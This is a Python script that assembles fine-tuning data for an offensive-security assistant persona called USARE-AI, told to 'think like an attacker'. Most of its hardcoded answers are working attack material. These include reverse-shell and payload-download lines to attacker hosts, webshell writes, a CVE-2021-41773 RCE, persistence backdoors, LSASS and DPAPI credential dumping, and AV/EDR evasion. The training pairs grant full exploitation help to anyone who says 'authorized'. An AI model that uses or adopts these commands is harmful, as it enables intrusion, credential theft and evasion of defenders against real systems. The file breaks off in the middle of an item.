"""
USARE — Cybersecurity Dataset Builder
======================================
Builds training data from:
  1. HuggingFace cybersecurity datasets (free, works on Lightning AI)
  2. Hardcoded expert knowledge base (attack chains, exploitation, evasion, etc.)

Usage:
    python finetune/build_dataset.py --out usare_dataset/cybersec_dataset.jsonl

No API keys needed. HuggingFace datasets download automatically.
"""

import json
import random
import logging
from pathlib import Path
from typing import List, Dict

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("usare.dataset")

SYSTEM = (
    "You are USARE-AI, an elite offensive cybersecurity specialist and penetration testing expert. "
    "You think like an attacker — methodical, creative, and always finding the path of least resistance. "
    "You have deep knowledge of exploits, evasion, post-exploitation, malware, reverse engineering, "
    "cryptography, and network protocols. You assist authorized security professionals and researchers. "
    "Be precise, technical, and actionable."
)


def fmt(instruction: str, response: str) -> Dict:
    return {
        "conversations": [
            {"role": "system",    "content": SYSTEM},
            {"role": "user",      "content": instruction},
            {"role": "assistant", "content": response},
        ]
    }


# =============================================================================
# HuggingFace Dataset Sources
# =============================================================================

def load_huggingface_datasets() -> List[Dict]:
    """
    Pull cybersecurity datasets from HuggingFace.
    All are free and public — no API key needed.
    """
    samples = []

    try:
        from datasets import load_dataset
    except ImportError:
        log.warning("datasets library not installed — skipping HuggingFace sources.")
        return samples

    # ── Source 1: SecQA — Security Q&A dataset ────────────────────────────────
    try:
        log.info("Loading zefang-liu/secqa...")
        ds = load_dataset("zefang-liu/secqa", split="train")
        count = 0
        for item in ds:
            q = item.get("question", "")
            a = item.get("answer", "")
            if q and a and len(a) > 50:
                samples.append(fmt(q, a))
                count += 1
        log.info(f"  SecQA: {count} samples")
    except Exception as e:
        log.warning(f"  SecQA failed: {e}")

    # ── Source 2: CTF challenges dataset ──────────────────────────────────────
    try:
        log.info("Loading BountyCon/CTF-dataset...")
        ds = load_dataset("BountyCon/CTF-dataset", split="train")
        count = 0
        for item in ds:
            challenge = item.get("challenge", "") or item.get("description", "")
            solution  = item.get("solution", "") or item.get("writeup", "")
            if challenge and solution and len(solution) > 100:
                samples.append(fmt(
                    f"Solve this CTF challenge:\n\n{challenge[:800]}",
                    solution[:2000]
                ))
                count += 1
        log.info(f"  CTF dataset: {count} samples")
    except Exception as e:
        log.warning(f"  CTF dataset failed: {e}")

    # ── Source 3: Cybersecurity instruction dataset ───────────────────────────
    try:
        log.info("Loading camel-ai/cybersecurity...")
        ds = load_dataset("camel-ai/cybersecurity", split="train")
        count = 0
        for item in ds:
            instruction = item.get("message_1", "") or item.get("instruction", "")
            response    = item.get("message_2", "") or item.get("output", "")
            if instruction and response and len(response) > 100:
                samples.append(fmt(instruction[:800], response[:2000]))
                count += 1
                if count >= 2000:
                    break
        log.info(f"  camel-ai/cybersecurity: {count} samples")
    except Exception as e:
        log.warning(f"  camel-ai/cybersecurity failed: {e}")

    # ── Source 4: General instruction tuning (security subset) ───────────────
    try:
        log.info("Loading security subset from teknium/OpenHermes-2.5...")
        ds = load_dataset("teknium/OpenHermes-2.5", split="train", streaming=True)
        count = 0
        security_keywords = [
            "exploit", "vulnerability", "CVE", "pentest", "penetration",
            "reverse shell", "privilege escalation", "SQL injection", "XSS",
            "buffer overflow", "malware", "payload", "bypass", "evasion",
            "nmap", "metasploit", "wireshark", "kali", "cybersecurity",
            "firewall", "IDS", "encryption", "hash", "brute force",
        ]
        for item in ds:
            convs = item.get("conversations", [])
            if len(convs) >= 2:
                user_msg  = next((c["value"] for c in convs if c.get("from") == "human"), "")
                asst_msg  = next((c["value"] for c in convs if c.get("from") == "gpt"), "")
                if (user_msg and asst_msg and len(asst_msg) > 150 and
                        any(kw.lower() in (user_msg + asst_msg).lower() for kw in security_keywords)):
                    samples.append(fmt(user_msg[:800], asst_msg[:2000]))
                    count += 1
                    if count >= 3000:
                        break
        log.info(f"  OpenHermes security subset: {count} samples")
    except Exception as e:
        log.warning(f"  OpenHermes failed: {e}")

    # ── Source 5: Cybersecurity QA ────────────────────────────────────────────
    try:
        log.info("Loading jclopeza/cybersecurity-qa...")
        ds = load_dataset("jclopeza/cybersecurity-qa", split="train")
        count = 0
        for item in ds:
            q = item.get("question", "") or item.get("input", "")
            a = item.get("answer", "") or item.get("output", "")
            if q and a and len(a) > 80:
                samples.append(fmt(q[:800], a[:2000]))
                count += 1
        log.info(f"  cybersecurity-qa: {count} samples")
    except Exception as e:
        log.warning(f"  cybersecurity-qa failed: {e}")

    log.info(f"HuggingFace total: {len(samples)} samples")
    return samples


# =============================================================================
# Hardcoded Expert Knowledge Base
# =============================================================================

def port_service_pairs() -> List[Dict]:
    data = [
        (21, "FTP", "vsftpd 2.3.4",
         "vsftpd 2.3.4 backdoor — CVE-2011-2523 (CVSS 10.0). Trigger: send USER with ':)' "
         "appended (e.g., USER hacker:)), PASS anything. Opens bind shell on port 6200. "
         "nc target 6200 gives root shell. "
         "Also check: anonymous FTP (USER anonymous, PASS anything), directory traversal '../', "
         "writable dirs for upload → plant webshell. "
         "Metasploit: exploit/unix/ftp/vsftpd_234_backdoor."),

        (22, "SSH", "OpenSSH 7.2p2",
         "OpenSSH 7.2p2: CVE-2018-15473 username enumeration (timing side-channel, CVSS 5.3). "
         "Valid usernames get a faster response than invalid ones. "
         "Enumerate: auxiliary/scanner/ssh/ssh_enumusers in Metasploit. "
         "Then spray: hydra -L valid_users.txt -P rockyou.txt ssh://target. "
         "Check weak key exchange: ssh-audit target (look for diffie-hellman-group1-sha1). "
         "Check password auth enabled vs key-only: grep PasswordAuthentication /etc/ssh/sshd_config."),

        (23, "Telnet", "any",
         "Telnet is cleartext — sniff with Wireshark filter: telnet. "
         "Common defaults: admin/admin, root/root, root/(blank), admin/(blank). "
         "Network devices: Cisco cisco/cisco, Juniper root/(blank). "
         "MitM trivial: arpspoof + Wireshark captures everything. "
         "Priority: HIGH — if on same network segment, credentials likely already exposed."),

        (80, "HTTP", "Apache 2.4.49",
         "Apache 2.4.49: CVE-2021-41773 path traversal + RCE (CVSS 9.8). "
         "Path traversal: curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd' "
         "RCE (if mod_cgi enabled): curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' "
         "-d 'echo Content-Type: text/plain; echo; id' "
         "Also: nikto -h target, gobuster dir -u http://target -w common.txt, "
         "check .git (git-dumper), backup files (.bak .old .swp ~)."),

        (445, "SMB", "Windows Server 2008 R2",
         "MS17-010 (EternalBlue, CVE-2017-0144, CVSS 9.3) — almost certain on 2008 R2. "
         "Verify: auxiliary/scanner/smb/smb_ms17_010. "
         "Exploit: exploit/windows/smb/ms17_010_eternalblue → SYSTEM shell. "
         "Also: PrintNightmare (CVE-2021-1675) if Print Spooler runs, "
         "null sessions: smbclient -L //target -N, "
         "enum4linux -a target (users, shares, password policy)."),

        (1433, "MSSQL", "Microsoft SQL Server 2014",
         "Try sa with blank/common passwords. "
         "With access: enable xp_cmdshell for OS RCE — "
         "EXEC sp_configure 'show advanced options',1; RECONFIGURE; "
         "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; "
         "EXEC xp_cmdshell 'whoami'; "
         "Metasploit: auxiliary/scanner/mssql/mssql_login → exploit/windows/mssql/mssql_payload. "
         "Check linked servers — pivot to other SQL instances."),

        (3306, "MySQL", "MySQL 5.7",
         "Try root with blank password: mysql -h target -u root -p(blank). "
         "With FILE priv: SELECT LOAD_FILE('/etc/passwd'); "
         "Write webshell: SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/sh.php'; "
         "UDF RCE: upload lib_mysqludf_sys.so → CREATE FUNCTION sys_exec RETURNS INT SONAME '...'. "
         "CVE-2016-6662: config injection via SELECT INTO OUTFILE overwriting my.cnf (CVSS 9.8)."),

        (3389, "RDP", "Windows Server 2019",
         "BlueKeep (CVE-2019-0708, CVSS 9.8): auxiliary/scanner/rdp/cve_2019_0708_bluekeep. "
         "DejaBlue (CVE-2019-1181/1182). "
         "Check NLA — if disabled, credential exposure before full auth. "
         "Spray: crackmapexec rdp target -u users.txt -p passwords.txt. "
         "xfreerdp /u:user /p:pass /v:target for interactive session."),

        (6379, "Redis", "Redis 5.0",
         "No auth = critical. Test: redis-cli -h target ping → PONG = open. "
         "SSH key write: CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; "
         "SET pwn '\\n\\nssh-rsa YOUR_KEY\\n\\n'; BGSAVE. "
         "Cron shell: CONFIG SET dir /var/spool/cron; CONFIG SET dbfilename root; "
         "SET x '\\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n'; BGSAVE. "
         "CVE-2022-0543: Lua sandbox escape RCE on Debian/Ubuntu."),

        (8080, "Tomcat", "Tomcat 7.0.88",
         "Check /manager/html — defaults: tomcat/tomcat, admin/admin, tomcat/s3cret. "
         "With manager: deploy WAR for RCE. "
         "msfvenom -p java/jsp_shell_reverse_tcp LHOST=x LPORT=4444 -f war > shell.war. "
         "Upload → browse /shell/ → reverse shell. "
         "CVE-2017-12615: PUT method enabled → upload JSP directly."),

        (9200, "Elasticsearch", "Elasticsearch 6.x",
         "Without X-Pack: curl http://target:9200/_cat/indices?v — list all data. "
         "Dump: curl http://target:9200/index/_search?size=1000. "
         "Look for: credentials, API keys, customer PII, session tokens. "
         "Script RCE (< 1.6.0): POST _search with Groovy script."),

        (27017, "MongoDB", "MongoDB 3.x",
         "No auth: mongo --host target → show dbs → use db → show collections → db.col.find(). "
         "Look for: user tables, session data, API keys, plaintext passwords. "
         "mongoexport to dump everything. "
         "Check port 28017 — old HTTP interface, sometimes accessible."),

        (2049, "NFS", "NFSv3",
         "showmount -e target — lists exports. "
         "If / or /etc exported: mount -t nfs target:/ /mnt → read /etc/shadow, write SSH keys. "
         "no_root_squash = root on your machine = root on server. Critical. "
         "Write SSH key: echo 'pubkey' >> /mnt/root/.ssh/authorized_keys → ssh as root."),

        (5432, "PostgreSQL", "PostgreSQL 12",
         "Try postgres/postgres, postgres/(blank): psql -h target -U postgres. "
         "Superuser RCE: COPY (SELECT '') TO PROGRAM 'id > /tmp/out'; "
         "File read: COPY /etc/passwd TO STDOUT; "
         "pg_hba.conf trust misconfiguration → auth bypass from any host."),

        (5900, "VNC", "VNC",
         "Try blank password, common: password, 12345, admin. "
         "nmap --script vnc-brute target. "
         "Connected = full desktop, often as SYSTEM or root. "
         "Capture challenge-response offline: auxiliary/scanner/vnc/vnc_login."),
    ]

    samples = []
    for port, svc, ver, analysis in data:
        samples.append(fmt(
            f"Port {port}/{svc} ({ver}) is open on an authorized target. "
            f"Analyze the attack surface and provide step-by-step exploitation guidance.",
            analysis
        ))
        samples.append(fmt(
            f"I'm doing an authorized pentest and found {svc} {ver} on port {port}. "
            f"Think like an attacker — what's the fastest path to exploitation?",
            analysis
        ))
        samples.append(fmt(
            f"What should I prioritize when I find port {port} open?",
            analysis
        ))
    return samples


def attack_chain_pairs() -> List[Dict]:
    return [
        fmt(
            "I have a foothold on Linux as www-data. Walk me through escalating to root.",
            "Linux privesc from www-data — systematic:\n\n"
            "1. ENUMERATE FIRST: uname -a, id, sudo -l, cat /etc/crontab, cat /etc/passwd\n"
            "   Upload linpeas: curl http://attacker/linpeas.sh | bash — RED/YELLOW = check first.\n\n"
            "2. SUDO RIGHTS (most common): sudo -l\n"
            "   Any binary listed? Check GTFOBins. Common wins:\n"
            "   sudo vim → :!/bin/bash | sudo find → -exec /bin/bash | sudo python → import os;os.system('/bin/bash')\n\n"
            "3. SUID BINARIES: find / -perm -4000 -type f 2>/dev/null\n"
            "   Check each against GTFOBins. python, perl, cp, find are common.\n\n"
            "4. CRON JOBS: cat /etc/crontab; ls /etc/cron.d/; cat /var/spool/cron/*\n"
            "   Writable script running as root? Append: echo 'chmod +s /bin/bash' >> script.sh\n"
            "   Wait for cron → /bin/bash -p → root.\n\n"
            "5. WRITABLE /etc/passwd: world-writable = direct root.\n"
            "   openssl passwd -1 -salt xyz pass123 → append 'hacker:HASH:0:0::/root:/bin/bash'\n\n"
            "6. KERNEL EXPLOITS: uname -r → searchsploit 'linux kernel VERSION'\n"
            "   DirtyPipe (CVE-2022-0847, kernel 5.8-5.16), DirtyCow (CVE-2016-5195, < 4.8.3)\n\n"
            "7. CREDENTIALS: grep -r 'password' /var/www/ /etc/ 2>/dev/null\n"
            "   cat ~/.bash_history — admins type passwords there constantly.\n\n"
            "8. CAPABILITIES: getcap -r / 2>/dev/null\n"
            "   python3 with cap_setuid: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
        ),

        fmt(
            "I compromised a Windows workstation as local user. How do I get to SYSTEM then Domain Admin?",
            "Windows: local user → SYSTEM → Domain Admin\n\n"
            "PHASE 1: LOCAL → SYSTEM\n"
            "1. winPEAS: upload winpeas.exe or IEX(New-Object Net.WebClient).DownloadString('http://attacker/winPEAS.ps1')\n\n"
            "2. SeImpersonatePrivilege (very common for service accounts):\n"
            "   PrintSpoofer.exe -i -c cmd (Server 2019+)\n"
            "   GodPotato, JuicyPotato depending on Windows version.\n\n"
            "3. AlwaysInstallElevated:\n"
            "   reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "   If 0x1: msfvenom ... -f msi → msiexec /quiet /i evil.msi → SYSTEM\n\n"
            "4. Unquoted service paths:\n"
            "   wmic service get pathname | findstr /i /v 'c:\\windows'\n"
            "   Plant exe in writable dir on unquoted path, restart service → SYSTEM.\n\n"
            "PHASE 2: SYSTEM → DOMAIN ADMIN\n"
            "5. Dump LSASS: mimikatz privilege::debug → sekurlsa::logonpasswords\n"
            "   Find domain admin NTLM hash or Kerberos ticket.\n\n"
            "6. Pass-the-Hash:\n"
            "   impacket-psexec -hashes :NTLM domain/admin@dc → SYSTEM on DC.\n\n"
            "7. Kerberoasting:\n"
            "   Rubeus.exe kerberoast → hashcat -m 13100 hashes.txt rockyou.txt\n"
            "   Cracked service account with DA rights → done.\n\n"
            "8. DCSync (if DA or replication rights):\n"
            "   mimikatz: lsadump::dcsync /domain:corp.local /user:krbtgt → golden ticket → eternal DA."
        ),

        fmt(
            "I found SQLi on an authorized target. Walk me through from injection to full server shell.",
            "SQLi → Shell — full chain:\n\n"
            "1. CONFIRM TYPE: ' in param → error. @@version (MySQL/MSSQL) or version() (PostgreSQL).\n\n"
            "2. EXTRACT DATA: sqlmap -u 'http://target/page?id=1' --dbs --tables --dump\n"
            "   Crack hashes: hashcat -m 0 hashes.txt rockyou.txt\n\n"
            "3. CODE EXECUTION — MySQL:\n"
            "   Check FILE priv: SELECT user,File_priv FROM mysql.user;\n"
            "   Write shell: SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/sh.php';\n"
            "   Access: http://target/sh.php?c=id\n\n"
            "4. CODE EXECUTION — MSSQL:\n"
            "   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
            "   EXEC xp_cmdshell 'powershell -enc PAYLOAD';\n\n"
            "5. AUTOMATE: sqlmap -u '...' --os-shell handles all of above automatically.\n\n"
            "6. UPGRADE: from webshell → full reverse shell → meterpreter → run privesc."
        ),

        fmt(
            "Explain Kerberoasting start to finish.",
            "Kerberoasting — complete attack:\n\n"
            "CONCEPT: Any domain user can request TGS tickets for SPNs. "
            "TGS is encrypted with the service account hash. Take offline, crack, no lockout.\n\n"
            "STEP 1: Any domain user (even low-priv workstation user).\n\n"
            "STEP 2: Find SPNs:\n"
            "   Rubeus.exe kerberoast /outfile:hashes.txt\n"
            "   impacket: GetUserSPNs.py domain/user:pass -dc-ip DC -request -outputfile hashes.txt\n\n"
            "STEP 3: Crack offline (no lockout, no noise):\n"
            "   hashcat -m 13100 hashes.txt rockyou.txt\n"
            "   hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule\n\n"
            "STEP 4: Use cracked password — if service account is DA, done.\n"
            "   If not — lateral move, check what it has access to.\n\n"
            "OPSEC: Request tickets one at a time. Target RC4 (etype 23) — weaker, faster to crack. "
            "Old service accounts with never-changed passwords are the jackpot."
        ),

        fmt(
            "I have a reverse shell. How do I make it fully interactive?",
            "Shell stabilization — dumb shell → full TTY:\n\n"
            "METHOD 1 — Python PTY (most common):\n"
            "   python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            "   Ctrl+Z → stty raw -echo; fg → reset\n"
            "   export TERM=xterm SHELL=bash\n"
            "   stty rows 50 cols 200 (match your terminal)\n\n"
            "METHOD 2 — socat (best quality):\n"
            "   Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444\n"
            "   Target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker:4444\n\n"
            "METHOD 3 — rlwrap (quick attacker-side):\n"
            "   rlwrap nc -lvp 4444 — adds arrow keys + history.\n\n"
            "TEST: Ctrl+C shouldn't kill shell, tab completion works, nano/vim work properly."
        ),
    ]


def evasion_pairs() -> List[Dict]:
    return [
        fmt(
            "How do I evade Windows Defender when running a payload?",
            "Windows Defender evasion:\n\n"
            "1. AMSI BYPASS (PowerShell first):\n"
            "   Patch amsi.dll in memory before running any PS commands.\n"
            "   Many public bypasses — search 'AMSI bypass 2024' for latest working variants.\n"
            "   Case variation and string splitting bypass signature-based detection.\n\n"
            "2. PROCESS INJECTION (avoid new process):\n"
            "   Inject into svchost, explorer — legitimate process covers your tracks.\n"
            "   Use direct syscalls (NtAllocateVirtualMemory etc.) instead of Win32 API.\n"
            "   EDRs hook Win32 — direct syscalls bypass the hooks.\n\n"
            "3. LIVING OFF THE LAND (LOLBins — signed Microsoft binaries):\n"
            "   mshta http://attacker/payload.hta\n"
            "   regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll\n"
            "   certutil -urlcache -f http://attacker/nc.exe nc.exe\n\n"
            "4. ENCODE AND SLEEP:\n"
            "   Encrypt shellcode at rest, decrypt only at execution time.\n"
            "   Sleep 10-30s before executing — sandbox timeout evasion.\n"
            "   Check for sandbox: few processes? tiny disk? no user activity? → don't run.\n\n"
            "5. SIGN YOUR TOOLS:\n"
            "   Self-signed or stolen cert on payload reduces AV suspicion.\n"
            "   Modify existing signed binaries carefully to avoid hash detection."
        ),

        fmt(
            "How do I scan a target stealthily without triggering IDS?",
            "Stealth scanning methodology:\n\n"
            "1. TIMING: nmap -T1 or USARE --profile ghost (60s mean delay).\n"
            "   Random jitter between probes defeats rate-based IDS.\n\n"
            "2. FRAGMENTATION: nmap -f (8-byte fragments), USARE --fragment overlap.\n"
            "   Many IDS fail to reassemble micro-fragments.\n\n"
            "3. DECOYS: nmap -D RND:10 — 10 random decoys alongside real source.\n"
            "   Analyst sees 11 sources — analyst fatigue.\n"
            "   USARE --decoys 10 integrated.\n\n"
            "4. SOURCE PORT: nmap --source-port 53 — looks like DNS traffic.\n"
            "   Firewalls often allow inbound from port 53.\n\n"
            "5. IDLE SCAN (zero attribution): nmap -sI zombie target\n"
            "   Target logs show zombie IP, not yours.\n\n"
            "6. HALF-OPEN SYN: never completes handshake = not logged by application.\n\n"
            "7. PROTOCOL TUNNELING: USARE --tunnel doh wraps in DNS-over-HTTPS."
        ),

        fmt(
            "What is process hollowing and how is it used for AV evasion?",
            "Process hollowing (RunPE):\n\n"
            "CONCEPT: Start legitimate process suspended, replace its memory with malicious code, "
            "resume. OS and AV see legitimate process (e.g., svchost.exe).\n\n"
            "STEPS:\n"
            "1. CreateProcess(target_exe, CREATE_SUSPENDED) — legitimate process, not running.\n"
            "2. Read PEB to get ImageBase: ReadProcessMemory(hProcess, PEB+0x10).\n"
            "3. Hollow: ZwUnmapViewOfSection(hProcess, imageBase) — remove legit code.\n"
            "4. Allocate: VirtualAllocEx(hProcess, imageBase, payload_size, RWX).\n"
            "5. Write: WriteProcessMemory() — write PE headers + sections.\n"
            "6. Fix entry point: SetThreadContext() — update EAX/RCX to new OEP.\n"
            "7. ResumeThread() — payload runs as the hollowed process.\n\n"
            "EDR DETECTION: RWX memory, PEB ImageBase != VAD base, private PE headers.\n"
            "EVASION: Direct syscalls avoid API hooks. Encrypt payload in memory. "
            "Use less-detected injection variants (early bird APC, thread hijacking)."
        ),
    ]


def post_exploitation_pairs() -> List[Dict]:
    return [
        fmt(
            "I have SYSTEM on Windows. What persistence techniques do I use?",
            "Windows SYSTEM persistence (stealthy → noisy):\n\n"
            "MOST STEALTHY:\n"
            "1. Golden Ticket (needs krbtgt hash):\n"
            "   mimikatz: kerberos::golden /user:admin /domain:corp /sid:S-1-5-... /krbtgt:HASH\n"
            "   Valid 10 years. Survives password changes.\n\n"
            "2. DCSync rights on low-priv account:\n"
            "   Add replication rights → always able to DCSync → always get fresh hashes.\n\n"
            "3. WMI Event Subscription (EDRs often miss this):\n"
            "   New-CimInstance -ClassName __EventFilter [...]\n"
            "   Triggers on event (logon, time) → runs payload → survives reboots.\n\n"
            "STANDARD:\n"
            "4. New admin user: net user backdoor P@ss /add && net localgroup administrators backdoor /add\n\n"
            "5. Registry Run key:\n"
            "   reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d 'C:\\payload.exe'\n\n"
            "6. Scheduled task:\n"
            "   schtasks /create /tn 'Updater' /tr 'C:\\payload.exe' /sc onlogon /ru SYSTEM\n\n"
            "7. Service: sc create SvcName binpath= 'C:\\payload.exe' start= auto"
        ),

        fmt(
            "How do I dump credentials from Windows without touching LSASS directly?",
            "LSASS-free credential extraction:\n\n"
            "1. SAM + SYSTEM registry:\n"
            "   reg save HKLM\\SAM C:\\sam.bak && reg save HKLM\\SYSTEM C:\\sys.bak\n"
            "   Transfer → impacket-secretsdump -sam sam.bak -system sys.bak LOCAL\n\n"
            "2. Volume Shadow Copy:\n"
            "   vssadmin create shadow /for=C:\\\n"
            "   copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM .\n\n"
            "3. DCSync (no LSASS touch):\n"
            "   mimikatz: lsadump::dcsync /domain:corp.local /all\n"
            "   impacket-secretsdump domain/admin:pass@dc_ip\n\n"
            "4. PowerShell history (gold mine):\n"
            "   cat (Get-PSReadlineOption).HistorySavePath — admins type credentials there.\n\n"
            "5. Browser credentials:\n"
            "   Chrome/Edge Login Data SQLite at %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\\n"
            "   SharpChrome, HackBrowserData tools.\n\n"
            "6. DPAPI secrets:\n"
            "   mimikatz: dpapi::masterkey /rpc → dpapi::cred — decrypts WiFi, browser, RDP creds."
        ),

        fmt(
            "How do I move laterally across a network once I have credentials?",
            "Lateral movement techniques:\n\n"
            "PASS-THE-HASH:\n"
            "   impacket-psexec -hashes :NTLM corp/admin@target → SYSTEM\n"
            "   cme smb subnet/24 -u admin -H NTLM — spray entire subnet\n\n"
            "PASS-THE-TICKET:\n"
            "   Rubeus.exe ptt /ticket:base64 → injects into current session\n"
            "   Then: dir \\\\target\\C$ — authenticated as ticket owner\n\n"
            "WMI (less noisy than PsExec):\n"
            "   impacket-wmiexec corp/admin:pass@target\n"
            "   No service creation — harder to detect\n\n"
            "WINRM:\n"
            "   evil-winrm -i target -u admin -p pass → PowerShell session\n"
            "   Requires port 5985, user in Remote Management Users group\n\n"
            "RDP:\n"
            "   xfreerdp /u:admin /p:pass /v:target\n\n"
            "OPSEC: WMI/WinRM leave fewer traces than PsExec. "
            "Avoid creating new accounts if possible — use existing legitimate ones."
        ),
    ]


def web_attack_pairs() -> List[Dict]:
    return [
        fmt(
            "I found a file parameter on an authorized web app. How do I test LFI and escalate to RCE?",
            "LFI → RCE:\n\n"
            "1. CONFIRM LFI:\n"
            "   ?file=../../../../etc/passwd\n"
            "   ?file=....//....//etc/passwd (bypass filter)\n"
            "   ?file=..%2F..%2Fetc%2Fpasswd (URL encode)\n\n"
            "2. GATHER INFO:\n"
            "   /etc/shadow, /proc/self/environ, ~/.ssh/id_rsa\n"
            "   /var/www/html/config.php (DB creds)\n\n"
            "3. RCE — Log Poisoning:\n"
            "   Inject PHP into User-Agent: curl -H 'User-Agent: <?php system($_GET[\"c\"]); ?>' target/\n"
            "   Include log: ?file=../../../../var/log/apache2/access.log&c=id\n\n"
            "4. RCE — PHP Wrappers:\n"
            "   ?file=php://input → POST: <?php system('id'); ?>\n"
            "   ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+ \n\n"
            "5. RCE — SSH auth log:\n"
            "   ssh '<?php system($_GET[\"c\"]); ?>'@target (inject into /var/log/auth.log)\n"
            "   Then include auth.log"
        ),

        fmt(
            "How do I find and exploit SSRF?",
            "SSRF — find and exploit:\n\n"
            "FIND:\n"
            "   Parameters: ?url=, ?host=, ?endpoint=, ?src=, ?callback=\n"
            "   PDF generators, image fetchers, webhook configs.\n"
            "   Test: replace with http://burp-collaborator — ping = SSRF confirmed.\n\n"
            "EXPLOIT:\n"
            "1. AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "   → AWS access keys. Game over for cloud environment.\n\n"
            "2. GCP: http://metadata.google.internal/computeMetadata/v1/ (needs Metadata-Flavor header)\n\n"
            "3. Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\n"
            "4. Internal services: http://localhost:8080/ (admin panels), http://localhost:6379/ (Redis)\n\n"
            "5. Port scan internal: different response times reveal open internal ports.\n\n"
            "BYPASSES:\n"
            "   http://2130706433/ (decimal 127.0.0.1)\n"
            "   http://0x7f000001/ (hex)\n"
            "   DNS rebinding, open redirectors"
        ),

        fmt(
            "Explain XXE and how to exploit it in an authorized pentest.",
            "XXE (XML External Entity):\n\n"
            "WHERE TO FIND:\n"
            "   SOAP APIs, file uploads (SVG, DOCX, XLSX), XML parsers.\n"
            "   Try changing Content-Type: application/json → application/xml.\n\n"
            "BASIC FILE READ:\n"
            "   <?xml version='1.0'?>\n"
            "   <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n"
            "   <root>&xxe;</root>\n\n"
            "BLIND XXE (OOB):\n"
            "   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://your-server/'>%xxe;]>\n"
            "   Server fetches your URL — confirms blind XXE.\n\n"
            "SSRF VIA XXE:\n"
            "   <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]>\n\n"
            "PHP RCE:\n"
            "   <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://id'>]>\n\n"
            "TOOLS: Burp Suite active scan, XXEinjector."
        ),
    ]


def ctf_reasoning_pairs() -> List[Dict]:
    return [
        fmt(
            "I found an unknown SUID binary on an authorized Linux target. How do I analyze it for privilege escalation?",
            "Unknown SUID binary analysis:\n\n"
            "1. BASIC INFO:\n"
            "   file ./binary — ELF type, stripped?\n"
            "   ls -la ./binary — confirm -rwsr-xr-x\n"
            "   strings ./binary — paths, commands, hardcoded passwords\n\n"
            "2. OBSERVE BEHAVIOR:\n"
            "   ltrace ./binary — library calls (shows system(), popen())\n"
            "   strace ./binary — syscalls (shows exec, open, read)\n\n"
            "3. PATH HIJACKING (most common for SUID):\n"
            "   strings shows 'cat file' without full path?\n"
            "   mkdir /tmp/x; echo '#!/bin/bash\\nbash -p' > /tmp/x/cat; chmod +x /tmp/x/cat\n"
            "   export PATH=/tmp/x:$PATH; ./binary → runs your 'cat' as root.\n\n"
            "4. BINARY PROTECTIONS:\n"
            "   checksec ./binary — NX? ASLR? stack canary? PIE?\n"
            "   No protections + takes user input → buffer overflow path.\n\n"
            "5. GTFOBINS:\n"
            "   If it's a known binary: gtfobins.github.io — check SUID section."
        ),

        fmt(
            "Explain how hash length extension attacks work and how to exploit them.",
            "Hash Length Extension:\n\n"
            "VULNERABLE: signature = MD5(secret + message) where you know message + signature.\n"
            "AFFECTED: MD5, SHA1, SHA256, SHA512 (Merkle-Damgård). NOT HMAC, NOT SHA3.\n\n"
            "HOW:\n"
            "MD5 internal state at end of hashing = the hash itself.\n"
            "You can feed that state more data and produce a valid hash for:\n"
            "(original_message + padding + your_data)\n"
            "Without knowing the secret.\n\n"
            "EXAMPLE:\n"
            "URL: /api?data=user=alice&admin=false&sig=MD5(secret+data)\n"
            "Goal: make admin=true with valid sig.\n"
            "hashpumpy(known_sig, known_msg, '&admin=true', len_of_secret)\n"
            "→ valid sig for user=alice&admin=false[PADDING]&admin=true\n"
            "Server reads last value → admin=true wins.\n\n"
            "TOOLS: hash_extender, hashpumpy, HashPump\n"
            "FIND: web apps using MD5/SHA(secret + user_data) for auth"
        ),
    ]


def malware_pairs() -> List[Dict]:
    return [
        fmt(
            "Walk me through analyzing a suspicious PowerShell script found on an authorized system.",
            "PowerShell script analysis:\n\n"
            "1. SPOT OBFUSCATION:\n"
            "   Look for: IEX, -EncodedCommand, DownloadString, FromBase64String, [char] arrays.\n\n"
            "2. DECODE BASE64:\n"
            "   [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('BASE64'))\n"
            "   Or: echo BASE64 | base64 -d (Linux)\n\n"
            "3. COMMON PATTERNS:\n"
            "   Downloader: IEX(New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')\n"
            "   Char array: [char[]](112,111,119,...) -join '' — assembles string char by char\n"
            "   AMSI bypass: look for 'amsiInitFailed' or 'AmsiScanBuffer'\n\n"
            "4. SAFE ANALYSIS:\n"
            "   Replace IEX with Write-Host — prints without executing.\n"
            "   Set-PSBreakpoint -Script s.ps1 -Line 1 → step through in ISE.\n\n"
            "5. EXTRACT IOCs:\n"
            "   C2 URLs/IPs, file paths, registry keys, scheduled task names.\n"
            "   Block at firewall/DNS, add to SIEM, write YARA rule."
        ),

        fmt(
            "Write a YARA rule to detect malware that uses CreateRemoteThread injection and connects to 10.10.10.99.",
